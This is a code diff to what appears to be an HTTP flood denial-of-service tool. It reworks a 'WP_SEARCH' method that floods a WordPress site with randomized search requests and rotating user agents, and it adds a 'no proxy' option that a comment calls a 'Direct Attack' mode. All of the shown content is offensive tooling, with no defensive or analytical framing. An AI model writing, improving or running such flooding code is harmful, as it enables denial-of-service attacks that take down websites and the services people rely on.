@@ -1576,16 +1576,11 @@ class HttpFlood(Thread):
         sep = "&" if "?" in self._target.raw_path_qs else "?"
         
         s = None
-        with suppress(Exception), self.open_connection() as s:
-             for _ in range(self._rpc):
-                 # Generate Random Search Query per Request
+        s = None
+        try:
+            s = self.open_connection()
+            for _ in range(self._rpc):
                 search_query = ProxyTools.Random.rand_str(randint(5, 15))
-                # WP_SEARCH is specific, so we might force it, OR mix it.
-                # But typically WP_SEARCH is for search. Let's keep it specific but use path helper if needed.
-                # Actually WP_SEARCH logic is specific to ?s= so we keep it independent of get_random_target_path 
-                # to ensure it hits the search function.
-                
-                # However, let's inject randomized headers
                 full_path = f"{self._target.raw_path_qs}{sep}s={search_query}"
                 ua = randchoice(self._useragents)
                 headers = self.build_consistent_headers(ua)
@@ -1602,6 +1597,9 @@ class HttpFlood(Thread):
                            f"\r\n").encode("utf-8")
                 
                 Tools.send(s, payload)
+        except Exception as e:
+            # print(f"DEBUG: WP_SEARCH Error: {e}") 
+            pass # Keep it clean for user, but structure is ready for debugging if needed
         Tools.safe_close(s)
 
     def XMLRPC_AMP(self):
@@ -1920,6 +1918,11 @@ class ToolsConsole:
 
 
 def handleProxyList(con, proxy_li, proxy_ty, url=None):
+    # [OPTIMIZED] Logic to Handle "No Proxy" Mode
+    # If user passed '0' or 'None' as filename, we return None (Direct Attack)
+    if str(proxy_li) in {"0", "None", "NONE", "none"}:
+        return None
+
     if proxy_ty not in {4, 5, 1, 0, 6}:
         exit("Socks Type Not Found [4, 5, 1, 0, 6]")
     if proxy_ty == 6:
